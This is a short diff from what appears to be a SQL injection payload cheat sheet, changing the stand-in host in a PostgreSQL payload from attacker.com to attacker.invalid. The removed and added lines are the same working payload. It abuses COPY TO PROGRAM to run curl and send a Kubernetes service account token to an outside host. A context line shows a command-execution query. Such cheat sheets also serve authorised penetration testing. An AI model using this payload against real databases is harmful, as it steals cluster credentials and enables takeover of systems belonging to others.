@@ -205,7 +205,7 @@ arjun -i crawl -oJ params.json
   SELECT * FROM cmd_exec; --
 
 -- K8s service account token exfil
-'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'; --
+'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.invalid/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'; --
 ```
 
 ### Oracle
